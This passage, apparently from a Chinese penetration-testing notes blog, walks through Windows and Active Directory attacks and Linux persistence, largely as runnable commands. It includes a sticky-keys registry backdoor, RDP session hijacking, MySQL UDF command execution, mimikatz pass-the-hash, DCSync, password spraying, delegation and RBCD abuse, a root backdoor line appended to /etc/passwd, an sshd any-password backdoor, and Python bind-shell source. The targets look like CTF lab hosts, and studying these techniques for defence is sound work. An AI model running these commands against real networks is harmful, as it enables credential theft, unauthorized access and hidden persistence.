class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span> <span class="comment">#把本来用户shift粘滞键启动替换为cmd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#最后点左下角的头像锁屏，按功能触发</span></span><br></pre></td></tr></table></figure>
<h4 id="远程桌面控制"><a href="#远程桌面控制" class="headerlink" title="远程桌面控制"></a>远程桌面控制</h4><h5 id="利用密码登录RDP-远程桌面"><a href="#利用密码登录RDP-远程桌面" class="headerlink" title="利用密码登录RDP 远程桌面"></a>利用密码登录RDP 远程桌面</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec rdp 172.22.6.0/24 -u wenshao -p hellokitty -d xiaorang.lab</span><br></pre></td></tr></table></figure>
<h5 id="利用哈希传递登录-RDP-远程桌面"><a href="#利用哈希传递登录-RDP-远程桌面" class="headerlink" title="利用哈希传递登录 RDP 远程桌面"></a>利用哈希传递登录 RDP 远程桌面</h5><p>抓取hash无法破解的情况下，如果使用hash远程登录RDP，需要开启”Restricted Admin Mode”, 在Windows8.1和Windows Server 2012R2上默认开启</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#客户端、服务器都需要开启Restricted Admin Mode</span></span><br><span class="line"><span class="comment">#对应命令行开启Restricted Admin mode的命令(需要管理员权限)</span></span><br><span class="line">REG ADD <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看是否已开启 DisableRestrictedAdmin REG_DWORD 0x0 存在就是开启</span></span><br><span class="line">REG query <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> | findstr <span class="string">&quot;DisableRestrictedAdmin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#攻击主机，mstsc.exe为远程桌面程序</span></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:&lt;username&gt; /domain:&lt;comptername or ip&gt; /ntlm: &lt;ntlm <span class="built_in">hash</span>&gt; <span class="string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="RDP会话劫持"><a href="#RDP会话劫持" class="headerlink" title="RDP会话劫持"></a>RDP会话劫持</h5><p>在 SYSTEM 权限下直接执行 tscon 会话切换,不需要提供用户密码<br>即使远程连接的用户关闭了远程连接窗口,仍能在 SYSTEM 权限下通过 tscon 实现未授权连接</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">quser/qwinsta <span class="comment">#查看会话id</span></span><br><span class="line">sc create rdp binpath= <span class="string">&quot;cmd.exe /k tscon ID /dest:console&quot;</span></span><br><span class="line">sc qc rdp</span><br><span class="line">sc start rdp</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用Psexec工具</span></span><br><span class="line">psexec -s -i cmd</span><br><span class="line">quser</span><br><span class="line">tscon ID /dest:console</span><br></pre></td></tr></table></figure>


<h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql-UDF提权"><a href="#mysql-UDF提权" class="headerlink" title="mysql UDF提权"></a>mysql UDF提权</h4><ol>
<li>查找插件库的路径<br><code>show variables like &#39;%plugin%&#39;</code></li>
<li>将so文件的内容解码，写入到mysql插件库目录中<br><code>select unhex(&#39;so文件的16进制编码&#39;) into dumpfile &#39;/usr/lib64/mysql/plugin/xxx.so&#39;</code></li>
<li>创建函数<br><code>create function sys_eval returns string soname &#39;xxx.so&#39;;</code></li>
<li>执行系统命令<br><code>select sys_eval(&quot;whoami&quot;);</code></li>
</ol>
<h2 id="域内横向"><a href="#域内横向" class="headerlink" title="域内横向"></a>域内横向</h2><h3 id="IPC-amp-at-amp-schticks"><a href="#IPC-amp-at-amp-schticks" class="headerlink" title="IPC$ &amp; at &amp; schticks"></a>IPC$ &amp; at &amp; schticks</h3><p>使用前提：<br>远程主机开启了ipc连接，远程主机139端口(NetBIOS协议)和445端口(SMB协议)开放</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> IPC$ 连接</span></span><br><span class="line">net use \\192.168.52.138\ipc$                   # 建立空连接</span><br><span class="line">net use \\192.168.52.138\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;  # 建立非空连接</span><br><span class="line"><span class="meta">#</span><span class="bash"> IPC$ 连接建立之后的操作</span></span><br><span class="line">dir \\192.168.52.138\c$                             # 列出目标文件目录</span><br><span class="line">type \\192.168.52.138\c$\1.txt  #远程读取文件                                       </span><br></pre></td></tr></table></figure>
<h4 id="at-amp-schtasks-使用"><a href="#at-amp-schtasks-使用" class="headerlink" title="at &amp; schtasks 使用"></a>at &amp; schtasks 使用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.52.138 #查看目标系统的时间</span><br><span class="line">copy calc.bat \\192.168.52.138\c$ #将文件复制到远程主机的c盘</span><br><span class="line">at \\192.168.52.138 4:11pm c:\calc.bat #设置定时任务</span><br></pre></td></tr></table></figure>
<p>windows server2008以后的版本at命令已经被弃用了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy hack.bat \\192.168.52.138\c$</span><br><span class="line">schtasks /create /tn hack /tr C:\hack.bat /sc ONSTART /s 192.168.52.138 /ru &quot;system&quot; /u administrator /p Abc123456！ #创建了名为hack的计划任务，设置计划任务在系统启动时触发，指定以系统权限（Local System）运行该计划任务。如果没有建立ipc$需要/u/p</span><br><span class="line">schtasks /run /tn hack /s 192.168.52.138</span><br><span class="line">schtasks /delete /s 192.168.52.138 /u administrator /p Abc123456! /tn hack /f</span><br></pre></td></tr></table></figure>

<h3 id="windows-Kerberos身份认证协议"><a href="#windows-Kerberos身份认证协议" class="headerlink" title="windows Kerberos身份认证协议"></a>windows Kerberos身份认证协议</h3><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1-1024x700.png" alt="1-1024x700"><br>krbtgt 用户，该用户是在创建域时系统自动创建的一个账号，其作用是密钥发行中心的服务账号，其密码是系统随机生成的，无法正常登陆主机。</p>
<p>SPN是服务器上所运行服务的唯一标示，每个使用Kerberos的服务都需要一个SPN，这样客户端才可以辨认这个服务。</p>
<p>可以把kerberos认证流程简要的分为三个部分：</p>
<h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>client向<strong>AS(Authentication Service)<strong>证明自己的身份的过程，目标是获取</strong>TGT(Ticket Granting Ticket)<strong>票据<br>请求包中包含：请求的用户名、客户端主机名、加密类型和</strong>Authenticator</strong>(用户NTLM hash加密的时间戳)以及一些其他信息。<br>AS会返回给Client一个<strong>Logon Session Key</strong>（请求用户client的NTLM hash对Session-key as进行加密）和<strong>krbtgt用户 hash加密的TGT票据</strong>(TGT里面包含PAC，PAC包含Client的域sid、Client所在的组)</p>
<h5 id="HASH传递（PTH）"><a href="#HASH传递（PTH）" class="headerlink" title="HASH传递（PTH）"></a>HASH传递（PTH）</h5><p>hash 传递的原理是在认证过程中，并不是直接使用用户的密码进行认证的，而是使用用户的hash值，因此，攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不需要提供明文密码(前提是得有相应的权限)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#运行mimikatz.exe</span></span><br><span class="line">privilege::debug  <span class="comment">#提升权限</span></span><br><span class="line">token::elevate <span class="comment">#将权限提升至system</span></span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords <span class="comment">#导出用户hash</span></span><br><span class="line">sekurlsa::pth /user:WIN2016$ /domain:XIAORANG /ntlm:adcd60560397bbaf2cd059dfe4676f77 <span class="comment">#获取后进行hash传递，登录域控</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用脚本连接</span></span><br><span class="line">proxychains impacket-wmiexec xiaorang.lab/Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2</span><br><span class="line">proxychains python3 smbexec.py -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.26 -codec gbk</span><br><span class="line"></span><br><span class="line">proxychains crackmapexec smb 172.22.9.7 -u administrator -H2f1b57eefb2d152196836b0516abea80 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag04.txt&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="DCsync攻击获取域内用户hash"><a href="#DCsync攻击获取域内用户hash" class="headerlink" title="DCsync攻击获取域内用户hash"></a>DCsync攻击获取域内用户hash</h5><p>DCSync是AD域渗透中常用的凭据窃取手段，默认情况下，域内不同DC每隔15分钟会进行一次数据同步，当一个DC从另外一个DC同步数据时，发起请求的一方会通过目录复制协议（MS- DRSR）来对另外一台域控中的域用户密码进行复制，DCSync就是利用这个原理，“模拟”DC向真实DC发送数据同步请求，获取用户凭据数据</p>
<p>默认以下用户存在该权限</p>
<pre><code>DC本地Administrators组内的用户
Domain Admins组内的用户
Enterprise Admins组内的用户    企业管理员
域控的机器帐户
</code></pre>
<p>默认只有<strong>域控的机器用户</strong>和<strong>域管理员</strong>能DCSYNC</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#msf中</span></span><br><span class="line">load kiwi <span class="comment">#加载mimikatz</span></span><br><span class="line">kiwi_cmd <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="comment">#执行一个DCSync攻击模拟，获取administrator的hash</span></span><br><span class="line"></span><br><span class="line">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span> <span class="comment">#使用kail自带的crackmapexec工具进行HASH传递，并登录172.22.1.2在上面执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#也可以用脚本</span></span><br><span class="line">proxychains secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm</span><br></pre></td></tr></table></figure>
<h6 id="writeDacl权限"><a href="#writeDacl权限" class="headerlink" title="writeDacl权限"></a>writeDacl权限</h6><p>具有 WriteDACL 权限, 也可以写 DCSync</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :4de6c4eeee1f315e1241c4a813e2b3b5 -action write -rights DCSync -principal Zhangtong -target-dn <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -dc-ip 172.22.3.2 <span class="comment">#对Zhangtong用户写 DCSync</span></span><br><span class="line">proxychains python3 secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm <span class="comment">#DCsync攻击获取域控hash</span></span><br><span class="line">proxychains python3 wmiexec.py xiaorang.lab/Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2 <span class="comment">#pth</span></span><br></pre></td></tr></table></figure>
<h6 id="PTH-的限制-UAC"><a href="#PTH-的限制-UAC" class="headerlink" title="PTH 的限制 UAC"></a>PTH 的限制 UAC</h6><h5 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h5><p>在kerberos的AS-REQ认证中当cname值中的用户不存在时返回包提示<strong>KDC_ERR_C_PRINCIPAL_UNKNOWN</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_linux_386 userenum --dc 172.22.6.12 -d xiaorang.lab usersname.txt -t 10</span><br></pre></td></tr></table></figure>
<h5 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.4.45 -u Adrian -p rockyou.txt -d WIN19</span><br><span class="line"></span><br><span class="line">proxychains4 hydra -L user.txt -P pass.txt 172.22.9.26 rdp &gt;&gt;result.txt</span><br><span class="line">cat result.txt|| grep account</span><br><span class="line"></span><br><span class="line">proxychains ./kerbrute_darwin_amd64 passwordspray --dc 172.22.9.7 -d xiaorang.lab ~/user.txt i9XDE02pLVf</span><br></pre></td></tr></table></figure>
<h5 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h5><p>**关闭预身份验证后(默认是不关闭)**，在进行AS_REQ之后的时候，KDC不会进行任何验证就将TGT和用该用户Hash加密的Login Session Key返回，由于AS_REP的数据包中Login Session Key的是由用户Hash进行加密的，因此，可以对获取到的用户Hash加密的Login Session Key进行离线爆破，得到对应用户的明文密码</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_darwin_amd64 userenum --dc 172.22.6.12 -d xiaorang.lab ~/users.txt -o output.txt <span class="comment">#枚举未设置预认证的账号</span></span><br><span class="line">hashcat -m 18200 1.txt -a 0 ./rockyou.txt  --force <span class="comment">#爆破密码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h5><p>(1):域名称<br>(2):域的SID值<br>(3):域的krbtgt账户密码HASH<br>(4):伪造用户名，可以是任意的</p>
<p>获取krbtgt的hash值，该值的方式有两种：</p>
<p>（1）控制了域控然后查询 <code>secretsdump.exe 域名/administrator:密码@IP</code></p>
<p>（2）通过dsync查询 <code>milikatz-&gt;lsadump::dcsync /domian:域名 /user:krbtgt</code></p>
<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p><strong>TGS(Ticket Granting Service)<strong>通过client的TGT判断其是否有服务的访问权限，目标是获取</strong>ST(SEerver Ticket)</strong><br>返回一个用<strong>Login session key</strong>加密后的用于确保客户端服务器之间通讯安全的<strong>server-session -key</strong>，并且生成用<strong>Server_Hash</strong>加密的<strong>TGS票据(ST)</strong></p>
<h5 id="委托攻击"><a href="#委托攻击" class="headerlink" title="委托攻击"></a>委托攻击</h5><p><strong>主机hostB上的服务B</strong>需要<strong>代表用户A</strong>去访问<strong>hostC上的服务C</strong>，这个过程就被称为委派<br>查询域委派关系</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains findDelegation.py xiaorang.lab/Aldrich:<span class="string">&#x27;P@ssw0rd&#x27;</span> -dc-ip 172.22.8.15 -target-domain xiaorang.lab</span><br></pre></td></tr></table></figure>
<h6 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h6><p><strong>任何用户</strong>都可以委派主机hostB代替自己去访问<strong>任何服务</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#某个用户委托hostB去访问某个服务，那么这个用户会将 TGT发送到hostB并缓存到LSASS中，以方便以后使用,如果这个用户是域用户我们就可以获取他的TGT</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="string">&quot;exit&quot;</span> <span class="comment">#导出域管的TGT</span></span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptt [0;4bbb6]-2-0-60a10000-Administrator@krbtgt-HACKME.COM.kirbi&quot;</span> <span class="string">&quot;exit&quot;</span> <span class="comment">#通过 Pass The Ticket（PTT）将 TGT 注入到当前会话中,[0;4bbb6]-2-0-60a10000-Administrator@krbtgt-HACKME.COM.kirbi是对应的TGT文件</span></span><br></pre></td></tr></table></figure>
<p>如果上面没有目标的tgt，可以使用NTLM Relay</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#上传Rubeus.exe 监听 TGT</span></span><br><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC01$</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用 DFSCoerce 漏洞利用工具，触发辅域控进行强制验证</span></span><br><span class="line">proxychains python3 dfscoerce.py -u win19$ -hashes <span class="string">&quot;aad3b435b51404eeaad3b435b51404ee:21b11500d5834a2b9b3373564a0565f6&quot;</span> -d xiaorang.lab win19 172.22.4.7</span><br><span class="line"></span><br><span class="line"><span class="comment">#导入 TGT 然后 DCSync</span></span><br><span class="line">Rubeus.exe ptt /ticket:xxx</span><br><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /all /csv&quot;</span></span><br></pre></td></tr></table></figure>
<h6 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h6><p>限制了访问的服务类型与资源主机，但是没有限制谁能对主机hostB进行委派<br>对于约束性委派，服务账号只能获取该用户的 ST 服务票据，从而只能模拟该用户访问特定的服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;exit&quot;</span> <span class="comment"># 获取自身的hash</span></span><br><span class="line"></span><br><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:NTLM哈希 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap <span class="comment">#申请 可转发TS(S4U2self协议允许服务代表任意用户请求访问自身服务的ST服务票据)，（需要提供可转发的TGT，自身的hash申请的）</span></span><br><span class="line"></span><br><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:你上面抓到的服务票据 <span class="comment">#使用上面获取S4U-TS伪造 Administrator 用户申请 ST(S4U2proxy协议允许服务在已取得S4U-TS下代表任意用户获取其他指定服务的服务票据)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#可以看出只要控制配置约束性委派服务的机器，那么我们就可以获得任意用户权限的ticket</span></span><br></pre></td></tr></table></figure>
<h6 id="基于资源的约束性委派-RBCD"><a href="#基于资源的约束性委派-RBCD" class="headerlink" title="基于资源的约束性委派(RBCD)"></a>基于资源的约束性委派(RBCD)</h6><p>基于资源的约束委派允许资源配置受信任的帐户委派给他们。由资源本身为自己配置资源委派信任关系，资源本身决定可以信任谁。</p>
<p>一般的情况是我们拿到一个域账户，其具备某台机器的属性修改的权限，那我们就可以获取这台主机的管理员权限</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用zhangxin域用户创建一个机器账户TEST2$(每个域用户默认可以创建10个)</span></span><br><span class="line">proxychains python3 addcomputer.py xiaorang.lab/zhangxin:<span class="string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip 172.22.60.8 -dc-host xiaorang.lab -computer-name <span class="string">&#x27;TEST2$&#x27;</span> -computer-pass <span class="string">&#x27;P@ssw0rd&#x27;</span></span><br><span class="line"><span class="comment">#然后修改Fileserver$的msDS-AllowedToActOnBehalfOfOtherIdentity 为新创建的机器用户的sid</span></span><br><span class="line">proxychains python3 rbcd.py xiaorang.lab/zhangxin:<span class="string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip 172.22.60.8 -action write -delegate-to <span class="string">&#x27;Fileserver$&#x27;</span> -delegate-from <span class="string">&#x27;TEST2$&#x27;</span></span><br><span class="line"><span class="comment">#利用该机器账户的凭证通过S4U协议伪造Administrator用户委派至目标主机的ST票据</span></span><br><span class="line">proxychains python3 getST.py xiaorang.lab/<span class="string">&#x27;TEST2$&#x27;</span>:<span class="string">&#x27;P@ssw0rd&#x27;</span> -spn cifs/Fileserver.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator.ccache <span class="comment">#导入申请的票据</span></span><br><span class="line">vim /etc/hosts <span class="comment">#改本地的/etc/hosts</span></span><br><span class="line">proxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk <span class="comment">#无密码连接</span></span><br></pre></td></tr></table></figure>

<h5 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h5><p>白银票据制作条件<br>(1):域名称<br>(2):域的SID<br>(3):域控服务器账户的NTLM-Hash(获取方法是可能域内某主机的hash和域控服务器的hash相同)<br>(4):伪造任意的用户名</p>
<h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p>client拿着ST票据与服务端进行通信，检测后允许访问该<strong>SPN(ServicePrincipal Names,服务主体名称)</strong></p>
<h3 id="NTLM-身份验证协议协议"><a href="#NTLM-身份验证协议协议" class="headerlink" title="NTLM 身份验证协议协议"></a>NTLM 身份验证协议协议</h3><p>早期SMB协议明文在网络上传输数据，后来诞生了LM验证机制，LM机制由于过于简单，微软提出了WindowsNT挑战/响应机制，这就是NTLM。远程桌面（3389）和文件共享（445）都使用的是ntlm进行认证<br>目前 NTLM 几个常见的使用场景：</p>
<pre><code>在域环境中用作 Kerberos 的备份，当Kerberos 失效时，就会使用 NTLM 进行认证。
使用本地账户登录时也会使用 NTLM 认证。
客户端尝试使用 ip 进行连接，而不是主机名时，也会使用 NTLM 进行认证。
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1423.1.png" alt="1423.1"></p>
<ol>
<li>**Application message(s)**：表示客户端和服务器之间发送的应用协议消息。</li>
<li><strong>NTLM_NEGOTIATE</strong>：client会向server发起请求连接协商，这个消息指定了该会话期望的安全特性。</li>
<li><strong>NTLM_CHALLENGE</strong>：server就会在本地生成一个（16位或8位）<strong>随机字符(Challenge)</strong>,并将Challenge传给client。</li>
<li><strong>NTLM_AUTHENTICATE</strong>：username的<strong>NTLM-hash</strong>对Challenge进行加密（加密过程中会利用到用户名、域名、机器名等相关信息），生成<strong>Response</strong>，并将Response发送给server</li>
<li>**Application message(s)**：server在收到Response后，将其和相同的方式进行加密生成另一个Response,如果相同，则验证成功，如果不同就失败<h2 id="域间横向"><a href="#域间横向" class="headerlink" title="域间横向"></a>域间横向</h2></li>
</ol>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><h4 id="添加root权限后门用户"><a href="#添加root权限后门用户" class="headerlink" title="添加root权限后门用户"></a>添加root权限后门用户</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;print crypt(&quot;M0rk&quot;, &quot;AA&quot;). &quot;\n&quot;&#x27;</span> <span class="comment">#密码M0rk</span></span><br><span class="line">AAhmo1jgYI0HE  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;backdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash&quot;</span>&gt;&gt;/etc/passwd <span class="comment">#添加用户到passwd文件</span></span><br><span class="line"></span><br><span class="line">touch -a -t 202401010830 filename.txt    <span class="comment"># 设置访问时间</span></span><br><span class="line">touch -m -t 202401011200 filename.txt    <span class="comment"># 设置修改时间</span></span><br></pre></td></tr></table></figure>

<p>排查：<br>检查/etc/passwd文件是否有异常</p>
<h4 id="ssh后门"><a href="#ssh后门" class="headerlink" title="ssh后门"></a>ssh后门</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#本地生成rsa公钥私钥</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat /root/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; /root/.ssh/key.txt</span><br><span class="line"><span class="comment">#将生成的公钥的内容追加到目标服务器的/root/.ssh/authorized_keys内即可</span></span><br><span class="line"></span><br><span class="line">cat /etc/ssh/sshd_config|grep UsePAM <span class="comment">#查看是否使用PAM进行身份验证，默认为yes</span></span><br><span class="line">ln -sf /usr/sbin/sshd /usr/<span class="built_in">local</span>/su;/usr/<span class="built_in">local</span>/su -oPort=1234</span><br><span class="line">ssh root@192.168.111.128 -p 1234 <span class="comment">#使用ssh任意密码连接1234端口登录root账户（其他用户也可以）</span></span><br></pre></td></tr></table></figure>

<h4 id="vim后门"><a href="#vim后门" class="headerlink" title="vim后门"></a>vim后门</h4><p>条件：安装了vim且安装了python扩展(绝大版本默认安装)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/lib/python2.7/site-packages <span class="comment">#进入py脚本目录</span></span><br><span class="line">$(nohup vim -E -c <span class="string">&quot;pyfile dir.py&quot;</span>&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2  <span class="comment">#Vim执行python脚本， nohup保证用户退出后依然可以执行</span></span><br><span class="line">rm -f dir.py <span class="comment">#删除恶意脚本</span></span><br></pre></td></tr></table></figure>
<p>恶意脚本dir.py的内容可以是任何功能的后门，如python版本的正向后门监听11端口：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html </span></span><br><span class="line">from socket import * </span><br><span class="line">import subprocess </span><br><span class="line">import os, threading, sys, time </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">server=socket(AF_INET,SOCK_STREAM) </span><br><span class="line">server.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,11)) </span><br><span class="line">server.listen(5) </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;waiting for connect&#x27;</span> </span><br><span class="line">talk, addr = server.accept() </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;connect from&#x27;</span>,addr </span><br><span class="line">proc = subprocess.Popen([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>], stdin=talk, stdout=talk, stderr=talk, shell=True) </span><br></pre></td></tr></table></figure>
<p>排查：<br>检测对应vim进程号虚拟目录的map文件是否有python字眼。</p>
